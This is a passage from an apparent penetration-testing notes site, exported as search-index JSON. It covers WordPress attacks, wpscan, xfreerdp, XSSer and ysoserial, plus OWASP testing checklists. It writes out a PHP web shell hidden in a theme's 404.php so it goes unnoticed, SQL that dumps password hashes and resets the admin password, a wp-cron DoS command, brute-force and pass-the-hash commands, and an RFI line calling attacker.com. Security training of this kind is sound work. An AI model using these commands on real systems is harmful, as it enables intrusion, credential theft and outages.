a web shell. Where? Appearance &gt; Theme editor. Choose a theme not in use and edit 404.php to add the shell. This is a quiet way not to be noticed.</p> <p>At the end of the file, you can add:</p> <pre><code>system($_GET['cmd']);\n</code></pre> <p>Exploitation:</p> <pre><code>curl -X GET \"http://&lt;target&gt;/wp-content/themes/twentyseventeen/404.php?cmd=id\"\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#metasploit-modules","title":"Metasploit modules","text":"<pre><code>use exploit/unix/webapp/wp_admin_shell_upload\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#interesting-files","title":"Interesting files","text":"<p>If somehow we get our hands on wp-config.php, then we will be able to see credentials to database. </p>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#post-exploitation","title":"Post Exploitation","text":"<p>Extract usernames and passwords:</p> <pre><code>mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e \"use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;\"\n</code></pre> <p>Change admin password:</p> <pre><code>mysql -u &lt;USERNAME&gt; --password=&lt;PASSWORD&gt; -h localhost -e \"use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;\"\n</code></pre>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#wp-cronphp-attack","title":"wp-cron.php attack","text":"<p>The WordPress application is vulnerable to a Denial of Service (DoS) attack via the wp-cron.php script. This script is used by WordPress to perform scheduled tasks, such as publishing scheduled posts, checking for updates, and running plugins.</p> <p>An attacker can exploit this vulnerability by sending a large number of requests to the wp-cron.php script, causing it to consume excessive resources and overload the server. This can lead to the application becoming unresponsive or crashing, potentially causing data loss and downtime.</p> <p>Steps to Reproduce:</p> <ul> <li>Get the doser.py script at https://github.com/Quitten/doser.py</li> <li>Use this command to run the script:</li> </ul> <pre><code>python3 doser.py -t 999 -g 'https://\u2588\u2588\u2588\u2588\u2588/wp-cron.php'\n</code></pre> <ul> <li>Go to https://\u2588\u2588\u2588\u2588 after 1000 requests of the doser.py script. The site returns code 502. See the video PoC.</li> </ul> <p>To mitigate this vulnerability, it is recommended to disable the default WordPress wp-cron.php script and set up a server-side cron job instead. Here are the steps to disable the default wp-cron.php script and set up a server-side cron job:</p> <ol> <li>Access your website\u2019s root directory via FTP or cPanel File Manager.</li> <li>Locate the wp-config.php file and open it for editing.</li> <li>Add the following line of code to the file, just before the line that says \u201cThat\u2019s all, stop editing! Happy publishing.\u201d:</li> </ol> <pre><code>define('DISABLE_WP_CRON',\u00a0true);\n</code></pre> <ol> <li>Save the changes to the wp-config.php file.</li> <li>Set up a server-side cron job to run the wp-cron.php script at the desired interval. This can be done using the server\u2019s control panel or by editing the server\u2019s crontab file.</li> </ol>","tags":["wordpress","pentesting","CMS"]},{"location":"wordpress-pentesting/#tools","title":"Tools","text":"<p>wpscan</p>","tags":["wordpress","pentesting","CMS"]},{"location":"wpscan/","title":"wpscan - Wordpress Security Scanner","text":"","tags":["pentesting","web pentesting","enumeration","wordpress"]},{"location":"wpscan/#installation","title":"Installation","text":"<p>Preinstalled in kali. </p> <p>See the repo: https://github.com/wpscanteam/wpscan.</p> <p>WPScan keeps a local database of metadata that is used to output useful information, such as the latest version of a plugin. The local database can be updated with the following command:</p> <pre><code>wpscan --update\n</code></pre>","tags":["pentesting","web pentesting","enumeration","wordpress"]},{"location":"wpscan/#basic-commands","title":"Basic commands","text":"<pre><code># Enumerate users\nwpscan --url https://target.tld/domain --enumerate u\nwpscan --url https://target.tld/ -eu\n\n# Enumerate a range of users 1-100\nwpscan --url https://target.tld/ --enumerate u1-100\nwpscan --url http://46.101.13.204:31822 --plugins-detection passive\n\n# Brute force attack on login page with passwords:\nwpscan --url HOST/domain -usernames admin, webadmin  --password-attack wp-login -passwords filename.txt\n# -usernames: those users that you are going to brute force\n# --password-attack: your URI target (different in the case of the WP api\n# -passwords: path/to/dictionary.txt\n\n# Brute force attack on xmlrpc with passwords:\nwpscan --password-attack xmlrpc -t 20 -U username1, username2 -P PATH/TO/passwords.txt --url http://&lt;TARGET&gt;\n\n\n# Enumerate plugins on pasive mode \nwpscan --url https://target.tld/ --plugins-detection passive \n# Modes: -mixed (default), -passive or -active\n\n# Common flags\n#   vp (Vulnerable plugins)\n#   ap (All plugins)\n#   p (Popular plugins)\n#   vt (Vulnerable themes)\n#   at (All themes)\n#   t (Popular themes)\n#   tt (Timthumbs)\n#   cb (Config backups)\n#   dbe (Db exports)\n#   u (User IDs range. e.g: u1-5)\n#   m (Media IDs range. e.g m1-15)\n\n# Ignore HTTPS Certificate\n--disable-tls-checks\n</code></pre>","tags":["pentesting","web pentesting","enumeration","wordpress"]},{"location":"wpscan/#examples-from-labs","title":"Examples from labs:","text":"<pre><code># Raven 1 machine\nwpscan --url http://192.168.56.104/wordpress --enumerate u --force --wp-content-dir wp-content\n</code></pre>","tags":["pentesting","web pentesting","enumeration","wordpress"]},{"location":"xfreerdp/","title":"xfreerdp","text":"<p>xfreerdp is an X11 Remote Desktop Protocol (RDP) client which is part of the FreeRDP project. An RDP server is built-in to many editions of Windows. </p>","tags":["tools","windows","rdp"]},{"location":"xfreerdp/#installation","title":"Installation","text":"<p>To install xfreerdp, proceed with the following command:</p> <pre><code>sudo apt-get install freerdp2-x11\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"xfreerdp/#basic-commands","title":"Basic commands","text":"<pre><code># No password indicated. When prompted for one, click Enter and see if it allows us to login\nxfreerdp [/d:domain] /u:&lt;username&gt; /v:$ip\n\nxfreerdp [/d:domain] /u:&lt;username&gt; /p:&lt;password&gt; /v:$ip\n# /v:{target_IP} : Specifies  the target IP of the host we would like to connect to.\n\nxfreerdp [/d:domain] /u:&lt;username&gt; /pth:&lt;hash&gt; /v:$ip\n# /pth:&lt;hash&gt;   Pass the hash\n</code></pre>","tags":["tools","windows","rdp"]},{"location":"xfreerdp/#troubleshoot-in-pth-attack","title":"Troubleshoot in PtH attack","text":"<p>Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, you will be presented with an error. This can be enabled by adding a new registry key <code>DisableRestrictedAdmin</code> (REG_DWORD) under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Lsa</code> with the value of 0. It can be done using the following command:</p> <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre> <p>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access.</p>","tags":["tools","windows","rdp"]},{"location":"xsltproc/","title":"xsltproc","text":"<p>xsltproc is a command line tool for applying XSLT stylesheets to XML documents. </p>","tags":["pentesting","tool","reporting","nmap"]},{"location":"xsltproc/#installation","title":"Installation","text":"<p>Preinstalled in kali. See oficial site: http://xmlsoft.org/xslt/xsltproc.html</p>","tags":["pentesting","tool","reporting","nmap"]},{"location":"xsltproc/#basic-usage","title":"Basic usage","text":"<pre><code>xsltproc target.xml -o target.html\n</code></pre>","tags":["pentesting","tool","reporting","nmap"]},{"location":"xsser/","title":"XSSer - An automated web pentesting framework tool to detect and exploit XSS vulnerabilities","text":"<p>A Cross Site Scripter (or XSSer) is an automatic framework to detect, exploit and report XSS vulnerabilities in web-based applications. It contains several options to try to bypass certain filters, and various special techniques of code injection. XSSer has pre-installed ( <code>&gt; 1300 XSS</code> ) attacking vectors and can bypass-exploit code on several browsers/WAFs.</p>","tags":["pentesting","web pentesting"]},{"location":"xsser/#installation","title":"Installation","text":"<pre><code>sudo apt install xsser\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"xsser/#usage","title":"Usage","text":"<p>Capture with BurpSuite a POST request and fuzz it with XSSER:</p> <pre><code>xsser --url \"http://demo.ine.local/index.php?page=dns-lookup.php\" -p \"target_host=XSS&amp;dns-lookup-php-submit-button=Lookup+DNS\" --auto\n# --url: to introduce the target\n# -p: Payload (it's the body of the POST request captured with Burpsuite). Use the characters 'XSS' to indicate where you want to inject the payloads that xsser is going to fuzz.\n#--auto: Inject a list of vectors provided by XSSer.\n# In the results you will have a confirmation about that parameter being injectable, and an example of payload. Use it for launching the Final Payload (-Fp).\n\nxsser --url \"http://demo.ine.local/index.php?page=dns-lookup.php\" -p \"target_host=XSS&amp;dns-lookup-php-submit-button=Lookup+DNS\" --Fp \"&lt;script&gt;alert(1)&lt;/script&gt;\"\n</code></pre> <p>With this, the encoded XSS payload is generated. Now, in Burp Suite, replace the POST parameters with the final attack payload and forward the request.</p> <p>Launch the XSSer interface:</p> <pre><code>xsser --gtk\n</code></pre>","tags":["pentesting","web pentesting"]},{"location":"ysoserial/","title":"ysoserial - A tool for Java deserialization","text":"","tags":["webpentesting","tools","deserialization","java"]},{"location":"ysoserial/#installation","title":"Installation","text":"<p>Repository: https://github.com/frohoff/ysoserial</p> <pre><code>git clone https://github.com/frohoff/ysoserial.git\n</code></pre> <p>Requires Java 1.7+ and Maven 3.x+</p> <pre><code>sudo apt-get install maven\n</code></pre> <p>As ysoserial presented some issues with java 21 version, be sure of your version</p> <pre><code>java --version\n</code></pre> <p>Check your installations:</p> <pre><code>sudo update-alternatives --config java\n</code></pre> <p>Results:</p> <pre><code>  Selection    Path                                         Priority   Status\n------------------------------------------------------------\n* 0            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      auto mode\n  1            /usr/lib/jvm/java-17-openjdk-amd64/bin/java   1711      manual mode\n  2            /usr/lib/jvm/java-21-openjdk-amd64/bin/java   2111      manual mode\n</code></pre> <p>Download Java 11:</p> <pre><code>sudo apt-get install openjdk-11-jdk \n</code></pre> <p>Run again</p> <pre><code>sudo update-alternatives --config java\n</code></pre> <p>And select the new installation. Then check out java version:</p> <p></p> <p>Additional debugging: Java not found in \u201cupdate-alternatives \u2014 config java\u201d after installing java on linux</p> <p>After using ysoserial you may reconfigure to use your latest java version.</p> <p>Build the app:</p> <pre><code>mvn clean package -DskipTests\n</code></pre>","tags":["webpentesting","tools","deserialization","java"]},{"location":"ysoserial/#basic-usage","title":"Basic usage","text":"<pre><code>java -jar ysoserial-all.jar [payload] \"[command]\"\n</code></pre> <p>See lab: Burpsuite Lab</p> <p>In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:</p> <pre><code>java -jar ysoserial-all.jar \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\ --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\ --add-opens=java.base/java.net=ALL-UNNAMED \\ --add-opens=java.base/java.util=ALL-UNNAMED \\ [payload] '[command]'\n</code></pre>","tags":["webpentesting","tools","deserialization","java"]},{"location":"OWASP/","title":"OWASP Web Security Testing Guide","text":"Phase Name of phase Objectives 1 Pre\u2013Engagement Define the scope and objectives of the penetration test, including the target web application, URLs, and functionalities to be tested.  Obtain proper authorization and permission from the application owner to conduct the test.  Gather relevant information about the application, such as technologies used, user roles, and business-critical functionalities. 2 Information Gathering &amp; Reconnaissance Perform passive reconnaissance to gather publicly available information about the application and its infrastructure.  Enumerate subdomains, directories, and files to discover hidden or sensitive content.  Use tools like \"Nmap\" to identify open ports and services running on the web server.  Utilize \"Google Dorks\" to find indexed information, files, and directories on the target website. 3 Threat Modeling Analyze the application's architecture and data flow to identify potential threats and attack vectors.  Build an attack surface model to understand how attackers can interact with the application.  Identify potential high-risk areas and prioritize testing efforts accordingly. 4 Vulnerability Scanning Use automated web vulnerability scanners like \"Burp Suite\" or \"OWASP ZAP\" to identify common security flaws.  Verify and validate the scan results manually to eliminate false positives and false negatives. 5 Manual Testing &amp; Exploitation Perform manual testing to validate and exploit identified vulnerabilities in the application.  Test for input validation issues, authentication bypass, authorization flaws, and business logic vulnerabilities.  Attempt to exploit security flaws to demonstrate their impact and potential risk to the application. 6 Authentication &amp; Authorization Testing Test the application's authentication mechanisms to identify weaknesses in password policies, session management, and account lockout procedures.  Evaluate the application's access controls to ensure that unauthorized users cannot access sensitive functionalities or data. 7 Session Management Testing Evaluate the application's session management mechanisms to prevent session fixation, session hijacking, and session-related attacks.  Check for session timeout settings and proper session token handling. 8 Information Disclosure Review how the application handles sensitive information such as passwords, user data, and confidential files.  Test for information disclosure through error messages, server responses, or improper access controls. 9 Business Logic Testing Analyze the application's business logic to identify flaws that could lead to unauthorized access or data manipulation.  Test for order-related vulnerabilities, privilege escalation, and other business logic flaws. 10 Client-Side Testing Evaluate the client-side code (HTML, JavaScript) for potential security vulnerabilities, such as DOM-based XSS.  Test for insecure client-side storage and sensitive data exposure. 11 Reporting &amp; Remediation Document and prioritize the identified security vulnerabilities and risks.  Provide a detailed report to developers and stakeholders, including recommendations for remediation.  Assist developers in fixing the identified security issues and retesting the application to ensure that the fixes were successful. 12 Post-Engagement Conduct a post-engagement meeting to discuss the test results with stakeholders.  Provide security awareness training to the development team to promote secure coding practices. <p>Other methodologies:  http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines PTES is a complete penetration testing methodology that covers all aspects of security assessments, including web application testing. It provides a structured approach from pre-engagement through reporting and follow-up, making it suitable for comprehensive assessments</p>","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#1-information-gathering","title":"1. Information Gathering","text":"1. Information Gathering ID Link to Hackinglife Link to OWASP Description 1.1 WSTG-INFO-01 Conduct Search Engine Discovery Reconnaissance for Information Leakage - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services). 1.2 WSTG-INFO-02 Fingerprint Web Server - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities. 1.3 WSTG-INFO-03 Review Webserver Metafiles for Information Leakage - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt, \\ tag, sitemap.xml)  - Extract and map other information that could lead to a better understanding of the systems at hand. 1.4 WSTG-INFO-04 Enumerate Applications on Webserver - Enumerate the applications within the scope that exist on a web server.  - Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers 1.5 WSTG-INFO-05 Review Webpage Content for Information Leakage - Review webpage comments, metadata, and redirect bodies to find any information leakage.- Gather JavaScript files and review the JS code to better understand the application and to find any information leakage. - Identify if source map files or other front-end debug files exist. 1.6 WSTG-INFO-06 Identify Application Entry Points - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis 1.7 WSTG-INFO-07 Map Execution Paths Through Application - Map the target application and understand the principal workflows. - Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough 1.8 WSTG-INFO-08 Fingerprint Web Application Framework - Fingerprint the components being used by the web applications.  - Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message. 1.9 WSTG-INFO-09 Fingerprint Web Application N/A, This content has been merged into: WSTG-INFO-08 1.10 WSTG-INFO-10 Map Application Architecture - Understand the architecture of the application and the technologies in use. - Identify application architecture whether on Application and Network components:  Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs, Network and Security: Reverse proxy, IPS, WAF","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#2-configuration-and-deploy-management-testing","title":"2. Configuration and Deploy Management Testing","text":"2. Configuration and Deploy Management Testing ID Link to Hackinglife Link to OWASP Description 2.1 WSTG-CONF-01 Test Network Infrastructure Configuration - Review the applications' configurations set across the network and validate that they are not vulnerable.  - Validate that used frameworks and systems are secure and not susceptible to known vulnerabilities due to unmaintained software or default settings and credentials. 2.2 WSTG-CONF-02.md Test Application Platform Configuration - Ensure that defaults and known files have been removed. - Review configuration and server handling (40, 50)  - Validate that no debugging code or extensions are left in the production environments.  - Review the logging mechanisms set in place for the application including Log Location, Log Storage , Log Rotation, Log Access Control, Log Review 2.3 WSTG-CONF-03.md Test File Extensions Handling for Sensitive Information - Dirbust sensitive file extensions, or extensions that might contain raw data (e.g. scripts, raw data, credentials, etc.). - Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)  - Validate that no system framework bypasses exist on the rules set. 2.4 WSTG-CONF-04 Review Old Backup and Unreferenced Files for Sensitive Information - Find and analyse unreferenced files that might contain sensitive information.  - Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename 2.5 WSTG-CONF-05 Enumerate Infrastructure and Application Admin Interfaces - Identify hidden administrator interfaces and functionality.  - Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080) 2.6 WSTG-CONF-06 Test HTTP Methods - Enumerate supported HTTP methods using OPTIONS. - Test for access control bypass (GET-&gt;HEAD-&gt;FOO). - Test HTTP method overriding techniques. 2.7 WSTG-CONF-07 Test HTTP Strict Transport Security - Review the HSTS header and its validity. - Identify HSTS header on Web server through HTTP response header: curl -s -D- https://domain.com/ | 2.8 WSTG-CONF-08 Test RIA Cross Domain Policy Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from. 2.9 WSTG-CONF-09 Test File Permission - Review and Identify any rogue file permissions. - Identify configuration file whose permissions are set to world-readable from the installation by default. 2.10 WSTG-CONF-10 Test for Subdomain Takeover - Enumerate all possible domains (previous and current). - Identify forgotten or misconfigured domains. 2.11 WSTG-CONF-11 Test Cloud Storage - Assess that the access control configuration for the storage services is properly in place. 2.12 WSTG-CONF-12 Testing for Content Security Policy - Review the Content-Security-Policy header or meta element to identify misconfigurations. 2.13 WSTG-CONF-13 Test Path Confusion - Make sure application paths are configured correctly.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#3-identity-management-testing","title":"3. Identity Management Testing","text":"3. Identity Management Testing ID Link to Hackinglife Link to OWASP Description 3.1 WSTG-IDNT-01 Test Role Definitions - Identify and document roles used by the application.  - Attempt to switch, change, or access another role.  - Review the granularity of the roles and the needs behind the permissions given. 3.2 WSTG-IDNT-02 Test User Registration Process - Verify that the identity requirements for user registration are aligned with business and security requirements.  - Validate the registration process. 3.3 WSTG-IDNT-03 Test Account Provisioning Process - Verify which accounts may provision other accounts and of what type. 3.4 WSTG-IDNT-04 Testing for Account Enumeration and Guessable User Account - Review processes that pertain to user identification (e.g. registration, login, etc.).  - Enumerate users where possible through response analysis. 3.5 WSTG-IDNT-05 Testing for Weak or Unenforced Username Policy - Determine whether a consistent account name structure renders the application vulnerable to account enumeration.  - User account names are often highly structured (e.g. Joe Bloggs account name is jbloggs and Fred Nurks account name is fnurks) and valid account names can easily be guessed.  - Determine whether the application's error messages permit account enumeration.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#4-authentication-testing","title":"4. Authentication Testing","text":"4. Authentication Testing ID Link to Hackinglife Link to OWASP Description 4.1 WSTG-ATHN-01 Testing for Credentials Transported over an Encrypted Channel N/A, This content has been merged into: WSTG-CRYP-03 4.2 WSTG-ATHN-02 Testing for Default Credentials - Determine whether the application has any User accounts with default passwords. 4.3 WSTG-ATHN-03 Testing for Weak Lock Out Mechanism - Evaluate the account lockout mechanism's ability to mitigate brute force password guessing.  - Evaluate the unlock mechanism's resistance to unauthorized account unlocking. 4.4 WSTG-ATHN-04 Testing for Bypassing Authentication Schema - Ensure that authentication is applied across all services that require it.  - Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection 4.5 WSTG-ATHN-05 Testing for Vulnerable Remember Password - Validate that the generated session is managed securely and do not put the user's credentials in danger (e.g., cookie)  - Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off? 4.6 WSTG-ATHN-06 Testing for Browser Cache Weaknesses - Review if the application stores sensitive information on the client-side.  - Review if access can occur without authorization.  - Check browser history issue by clicking \"Back\" button after logging out.  - Check browser cache issue from HTTP response headers (Cache-Control: nocache) 4.7 WSTG-ATHN-07 Testing for Weak Password Policy - Determine the resistance of the application against brute Force password guessing using available password dictionaries by evaluating the length, complexity, reuse, and aging requirements of passwords.  - Review whether new User accounts are created with weak or predictable passwords. 4.8 WSTG-ATHN-08 Testing for Weak Security Question Answer - Determine the complexity and how straight-forward the questions are (Weak pre-generated questions, Weak self-generated question)  - Assess possible user answers and brute force capabilities. 4.9 WSTG-ATHN-09 Testing for Weak Password Change or Reset Functionalities - Determine whether the password change and reset functionality allows accounts to be compromised.  - Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?)  - Test password change (Need old password?) 4.10 WSTG-ATHN-10 Testing for Weaker Authentication in Alternative Channel - Identify alternative authentication channels.  - Assess the security measures used and if any bypasses exists on the alternative channels. 4.11 WSTG-ATHN-11 Testing Multi-Factor Authentication (MFA) - Identify the type of MFA used by the application.  - Determine whether the MFA implementation is robust and secure.  - Attempt to bypass the MFA.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#5-authorization-testing","title":"5. Authorization Testing","text":"5. Authorization Testing ID Link to Hackinglife Link to OWASP Description 5.1 WSTG-ATHZ-01 Testing Directory Traversal File Include - Identify injection points that pertain to path traversal.  - Assess bypassing techniques and identify the extent of path traversal (dot-dot-slash attack, Local/Remote file inclusion) 5.2 WSTG-ATHZ-02 Testing for Bypassing Authorization Schema - Assess if horizontal or vertical access is possible.  - Access to Administrative functions by force browsing (/admin/addUser) 5.3 WSTG-ATHZ-03 Testing for Privilege Escalation - Identify injection points related to role/privilege manipulation. For example: Change some param groupid=2 to groupid=1  - Verify that it is not possible for a user to modify their privileges or roles inside the application  - Fuzz or otherwise attempt to bypass security measures. 5.4 WSTG-ATHZ-04 Testing for Insecure Direct Object References - Identify points where object references may occur.  - Assess the access control measures and if they're vulnerable to IDOR. For example: Force changing parameter value (?invoice=123 -&gt; ?invoice=456) 5.5 WSTG-ATHZ-05 Testing for OAuth Weaknesses - Determine if OAuth2 implementation is vulnerable or using a deprecated or custom implementation.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#6-session-management-testing","title":"6. Session Management Testing","text":"6. Session Management Testing ID Link to Hackinglife Link to OWASP Description 6.1 WSTG-SESS-01 Testing for Session Management Schema - Gather session tokens, for the same user and for different users where possible.  - Analyze and ensure that enough randomness exists to stop session forging attacks.  - Modify cookies that are not signed and contain information that can be manipulated. 6.2 WSTG-SESS-02 Testing for Cookies Attributes - Ensure that the proper security configuration is set for cookies (HTTPOnly and Secure flag, Samesite=Strict) 6.3 WSTG-SESS-03 Testing for Session Fixation - Analyze the authentication mechanism and its flow.  - Force cookies and assess the impact.  - Check whether the application renew the cookie after a successfully user authentication. 6.4 WSTG-SESS-04 Testing for Exposed Session Variables - Ensure that proper encryption is implemented (Encryption &amp; Reuse of session Tokens vulnerabilities).  - Review the caching configuration.  - Assess the channel and methods' security (Send sessionID with GET method ?) 6.5 WSTG-SESS-05 Testing for Cross Site Request Forgery - Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.  - Conduct URL analysis, Direct access to functions without any token. 6.6 WSTG-SESS-06 Testing for Logout Functionality - Assess the logout UI.  - Analyze the session timeout and if the session is properly killed after logout. 6.7 WSTG-SESS-07 Testing Session Timeout - Validate that a hard session timeout exists, after the timeout has passed, all session tokens should be destroyed or be unusable. 6.8 WSTG-SESS-08 Testing for Session Puzzling - Identify all session variables.  - Break the logical flow of session generation.  - Check whether the application uses the same session variable for more than one purpose 6.9 WSTG-SESS-09 Testing for Session Hijacking - Identify vulnerable session cookies.  - Hijack vulnerable cookies and assess the risk level. 6.10 WSTG-SESS-10 Testing JSON Web Tokens - Determine whether the JWTs expose sensitive information.  - Determine whether the JWTs can be tampered with or modified.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#7-data-validation-testing","title":"7. Data Validation Testing","text":"7. Data Validation Testing ID Link to Hackinglife Link to OWASP Description 7.1 WSTG-INPV-01 Testing for Reflected Cross Site Scripting - Identify variables that are reflected in responses.  - Assess the input they accept and the encoding that gets applied on return (if any). 7.2 WSTG-INPV-02 Testing for Stored Cross Site Scripting - Identify stored input that is reflected on the client-side.  - Assess the input they accept and the encoding that gets applied on return (if any). 7.3 WSTG-INPV-03 Testing for HTTP Verb Tampering N/A, This content has been merged into: WSTG-CONF-06 7.4 WSTG-INPV-04 Testing for HTTP Parameter Pollution - Identify the backend and the parsing method used.  - Assess injection points and try bypassing input filters using HPP. 7.5 WSTG-INPV-05 Testing for SQL Injection - Identify SQL injection points.  - Assess the severity of the injection and the level of access that can be achieved through it. 7.6 WSTG-INPV-06 Testing for LDAP Injection - Identify LDAP injection points:  /ldapsearch?user=  user=user=)(uid=))(|(uid=*  pass=password  - Assess the severity of the injection: 7.7 WSTG-INPV-07 Testing for XML Injection - Identify XML injection points with XML Meta Characters:  ', \" , &lt;&gt;, , &amp;, &lt;![CDATA[ / ]]&gt;, XXE, TAG  - Assess the types of exploits that can be attained and their severities. 7.8 WSTG-INPV-08 Testing for SSI Injection - Identify SSI injection points (Presense of .shtml extension) with these characters:  &lt; ! # = / . \" - &gt; and [a-zA-Z0-9]  - Assess the severity of the injection. 7.9 WSTG-INPV-09 Testing for XPath Injection - Identify XPATH injection points by checking for XML error enumeration by supplying a single quote ('):  Username: \u2018 or \u20181\u2019 = \u20181  Password: \u2018 or \u20181\u2019 = \u20181 7.10 WSTG-INPV-10 Testing for IMAP SMTP Injection - Identify IMAP/SMTP injection points (Header, Body, Footer) with special characters (i.e.: \\, \u2018, \u201c, @, #, !, |)  - Understand the data flow and deployment structure of the system.  - Assess the injection impacts. 7.11 WSTG-INPV-11 Testing for Code Injection - Identify injection points where you can inject code into the application.  - Check LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource).  - Check RFI from malicious URL  ?page.php?file=http://attacker.com/malicious_page  - Assess the injection severity. 7.12 WSTG-INPV-12 Testing for Command Injection - Identify and assess the command injection points with special characters (i.e.: | ; &amp; $ &gt; &lt; ' !)  For example: ?doc=Doc1.pdf+|+Dir c:| 7.13 WSTG-INPV-13 Testing for Format String Injection - Assess whether injecting format string conversion specifiers into user-controlled fields causes undesired behavior from the application. 7.14 WSTG-INPV-14 Testing for Incubated Vulnerability - Identify injections that are stored and require a recall step to the stored injection. (i.e.: CSV Injection, Blind Stored XSS, File Upload)  - Understand how a recall step could occur.  - Set listeners or activate the recall step if possible. 7.15 WSTG-INPV-15 Testing for HTTP Splitting Smuggling - Assess if the application is vulnerable to splitting, identifying what possible attacks are achievable. - Assess if the chain of communication is vulnerable to smuggling, identifying what possible attacks are achievable. 7.16 WSTG-INPV-16 Testing for HTTP Incoming Requests - Monitor all incoming and outgoing HTTP requests to the Web Server to inspect any suspicious requests. - Monitor HTTP traffic without changes of end user Browser proxy or client-side application. 7.17 WSTG-INPV-17 Testing for Host Header Injection - Assess if the Host header is being parsed dynamically in the application.  - Bypass security controls that rely on the header. 7.18 WSTG-INPV-18 Testing for Server-side Template Injection - Detect template injection vulnerability points. - Identify the templating engine.  - Build the exploit. 7.19 WSTG-INPV-19 Testing for Server-Side Request Forgery - Identify SSRF injection points.  - Test if the injection points are exploitable.  - Asses the severity of the vulnerability. 7.20 WSTG-INPV-20 Testing for Mass Assignment - Identify requests that modify objects  - Assess if it is possible to modify fields never intended to be modified from outside","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#8-error-handling","title":"8. Error Handling","text":"8. Error Handling ID Link to Hackinglife Link to OWASP Description 8.1 WSTG-ERRH-01 Testing for Improper Error Handling - Identify existing error output (i.e.: Random files/folders (40x)  - Analyze the different output returned. 8.2 WSTG-ERRH-02 Testing for Stack Traces N/A, This content has been merged into: WSTG-ERRH-01","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#9-cryptography","title":"9. Cryptography","text":"9. Cryptography ID Link to Hackinglife Link to OWASP Description 9.1 WSTG-CRYP-01 Testing for Weak Transport Layer Security - Validate the server configuration (Identify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)  - Review the digital certificate's cryptographic strength and validity.  - Ensure that the TLS security is not bypassable and is properly implemented across the application. 9.2 WSTG-CRYP-02 Testing for Padding Oracle - Identify encrypted messages that rely on padding.  - Attempt to break the padding of the encrypted messages and analyze the returned error messages for further analysis. 9.3 WSTG-CRYP-03 Testing for Sensitive Information Sent via Unencrypted Channels - Identify sensitive information transmitted through the various channels.  - Assess the privacy and security of the channels used.  - Check sensitive data during the transmission:  \u2022 Information used in authentication (e.g. Credentials, PINs, Session, identifiers, Tokens, Cookies\u2026), \u2022 Information protected by laws, regulations or specific organizational, policy (e.g. Credit Cards, Customers data) 9.4 WSTG-CRYP-04 Testing for Weak Encryption - Provide a guideline for the identification weak encryption or hashing uses and implementations.","tags":["pentesting","web","pentesting","exploitation"]},{"location":"OWASP/#10-business-logic-testing","title":"10. Business logic Testing","text":"10. Business logic Testing ID Link to Hackinglife Link to OWASP Description 10.1 WSTG-BUSL-01 Test Business Logic Data Validation - Identify data injection points.  - Validate that all checks are occurring on the back end and can't be bypassed.  - Attempt to break the format of the expected data and analyze how the application is handling it. 10.2 WSTG-BUSL-02 Test Ability to Forge Requests - Review the project documentation looking for guessable, predictable, or hidden functionality of fields.  - Insert logically valid data in order to bypass normal business logic workflow. 10.3 WSTG-BUSL-03 Test Integrity Checks - Review the project documentation for components of the system that move, store, or handle data.  - Determine what type of data is logically acceptable by the component and what types the system should guard against.  - Determine who should be allowed to modify or read that data in each component.  - Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow. 10.4 WSTG-BUSL-04 Test for Process Timing - Review the project documentation for system functionality that may be impacted by time. Such as execution time or actions that help users predict a future outcome or allow one to circumvent any part of the business logic or workflow. For example, not completing transactions in an expected time.  - Develop and execute the mis-use cases ensuring that attackers can not gain an advantage based on any timing (Race Condition). 10.5 WSTG-BUSL-05 Test Number of Times a Function Can Be Used Limits - Identify functions that must set limits to the times they can be called.  - Assess if there is a 